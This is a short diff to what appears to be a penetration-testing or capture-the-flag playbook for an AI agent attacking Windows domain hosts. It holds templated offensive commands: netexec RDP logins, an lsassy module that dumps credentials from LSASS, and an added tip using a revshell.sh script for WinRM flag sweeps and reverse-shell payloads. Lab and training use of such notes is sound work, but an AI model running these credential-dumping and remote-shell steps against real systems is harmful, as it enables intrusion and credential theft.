@@ -42,6 +42,11 @@ nxc rdp   {{CIDR}} -u {{USER}} -p '{{PASS}}'
 
 Once on the box: `onhost.md`. From Kali, prefer `nxc -M lsassy` before you RDP.
 
+**Just need the flag / a file? Don't loop one-off `atexec` calls (token waste).**
+`revshell.md`: `revshell.sh flags {{DC}} -u {{USER}} -p '{{PASS}}' -d {{DOMAIN}}`
+is one WinRM sweep of every flag location. Want interactive? `revshell.sh
+payload/listen` — but catch it in a tty, never over MCP.
+
 ## Fail → next
 
 | Symptom | Next |
